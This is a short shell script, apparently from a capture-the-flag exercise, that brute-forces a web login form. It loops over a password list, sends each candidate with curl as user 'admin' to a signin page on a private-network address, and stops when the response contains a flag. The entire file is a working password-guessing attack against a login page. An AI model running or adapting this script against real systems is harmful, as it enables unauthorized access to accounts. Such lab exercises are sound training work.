#!/bin/sh

passlist=$(cat passlist)
for pass in ${passlist[@]}
do
    echo "test with pass: ${pass}"
    test=$(curl -s "http://192.168.56.101/index.php?page=signin&username=admin&password=${pass}&Login=Login#" | grep 'flag')
    if [ "$test" ]
    then
        echo $test
        break
    fi
done;